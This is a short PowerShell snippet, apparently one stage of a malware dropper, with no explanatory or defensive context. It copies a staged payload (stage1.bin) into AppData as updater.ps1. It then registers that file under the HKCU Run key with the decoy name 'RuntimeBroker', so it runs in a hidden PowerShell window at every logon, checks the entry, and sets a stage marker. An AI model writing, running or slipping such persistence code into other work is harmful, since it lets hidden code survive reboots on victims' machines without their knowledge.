
Copy-Item -Path "$env:TEMP\stage1.bin" -Destination "$env:APPDATA\updater.ps1" -Force
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RuntimeBroker' -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + "$env:APPDATA\updater.ps1" + '"') -Force
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RuntimeBroker'
$StageMarker = "stage-41"
